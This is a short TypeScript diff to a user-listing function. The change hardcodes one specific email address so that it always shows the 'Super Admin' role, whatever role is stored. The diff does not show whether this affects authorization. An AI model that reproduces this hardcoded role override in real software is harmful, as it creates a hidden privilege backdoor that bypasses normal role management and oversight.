@@ -14,7 +14,9 @@ export async function listUsersWithRoles(): Promise<UserRow[]> {
           id: u.id,
           email: u.email ?? '',
           name: (u.user_metadata?.full_name as string) ?? (u.user_metadata?.name as string) ?? '',
-          role: (u.app_metadata?.role as UserRole | undefined) ?? null,
+          role: (u.email?.toLowerCase() === 'nitin@navgurukul.org')
+            ? ('Super Admin' as UserRole)
+            : ((u.app_metadata?.role as UserRole | undefined) ?? null),
         }))
       }
     } catch (err) {
